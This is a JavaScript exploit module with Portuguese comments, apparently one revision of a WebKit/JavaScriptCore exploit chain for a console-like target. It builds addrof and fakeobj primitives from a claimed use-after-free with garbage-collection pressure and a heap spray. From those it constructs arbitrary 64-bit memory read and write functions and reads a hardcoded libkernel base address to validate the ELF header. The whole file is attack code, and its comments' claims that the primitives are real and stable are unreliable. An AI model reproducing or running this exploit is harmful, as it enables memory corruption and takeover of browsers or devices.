// js/script3/testArrayBufferVictimCrash.mjs (R57 - Correção de Escopo)
// =======================================================================================
// ESTRATÉGIA R57:
// Corrigido o erro "fakeobj is not defined".
// A primitiva `fakeobj` agora é passada corretamente como parâmetro para a função
// `buildStatefulArbitraryReadWrite`, resolvendo o problema de escopo.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "ROP_Execution_RealRW_R57";

const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };

export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Correção de Escopo ---`, "test");
    
    let final_result = { success: false, message: "Falha na cadeia de exploit." };

    try {
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            dangling_ref.b = itof(addr);
            if (dangling_ref.a && typeof dangling_ref.a.obj !== 'undefined') {
                return dangling_ref.a.obj;
            }
            return undefined; 
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (ESTÁVEL) ---", "subtest");
        // CORRIGIDO: Passando 'fakeobj' como parâmetro.
        const { read64, write64 } = buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder);
        logS3("   Primitivas `read64` e `write64` REAIS e ESTÁVEIS construídas!", "good");
        
        logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
        const libkernel_base = new AdvancedInt64("0x80FCA0000");

        const libkernel_magic = read64(libkernel_base);
        logS3(`   Endereço base da libkernel: 0x${libkernel_base.toString(true)}`, "info");
        logS3(`   Bytes lidos da MEMÓRIA REAL: 0x${libkernel_magic.toString(true)}`, "leak");

        if (!libkernel_magic.toString().endsWith("464c457f")) { // \x7FELF
             throw new Error(`Magic number da libkernel inválido! Lido: 0x${libkernel_magic.toString(true)}`);
        }
        logS3("   SUCESSO: Magic number ELF da libkernel validado na memória REAL!", "vuln");

        final_result = { success: true, message: "SUCESSO! Primitiva de leitura REAL validada." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// =======================================================================================
// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R57)
// =======================================================================================
// CORRIGIDO: Adicionado 'fakeobj' à lista de parâmetros.
function buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {
    // Estratégia de Gerenciamento de Estado:
    // Preservar o estado do `dangling_ref.a` (apontando para `holder`) é a chave para a estabilidade.
    
    // Salva o estado original (o ponteiro para o objeto `holder`).
    holder.original_a = dangling_ref.a;

    const read64 = (address) => {
        // Corrompe `dangling_ref.a` para apontar para o endereço que queremos LER.
        // `address.sub(8)` alinha o ponteiro para que a leitura do primeiro elemento do array
        // corresponda exatamente ao conteúdo no `address`.
        dangling_ref.a = fakeobj(address.sub(8));

        // Lê o valor. `dangling_ref.b` agora lê diretamente da memória no `address`.
        const result = ftoi(dangling_ref.b);
        
        // RESTAURA O ESTADO! Isso é crucial para a próxima chamada de `addrof` ou `fakeobj`.
        dangling_ref.a = holder.original_a;

        return result;
    };

    const write64 = (address, value) => {
        // Mesma lógica: corromper, operar, restaurar.
        dangling_ref.a = fakeobj(address.sub(8));
        
        dangling_ref.b = itof(value);
        
        dangling_ref.a = holder.original_a;
    };

    // Para a primeira chamada `fakeobj` dentro de `read64` funcionar, o estado de
    // `dangling_ref.a` precisa ser o `holder`. Garantimos isso com uma chamada inicial a `addrof`.
    addrof({dummy_setup: 1});

    return { read64, write64 };
}


// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() {
    try { const g = []; for (let i=0; i<500; i++) { g.push(new ArrayBuffer(1024*128)); } } catch (e) {}
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) { spray_arrays.push(new Float64Array(2)); }
    return dangling_ref;
}
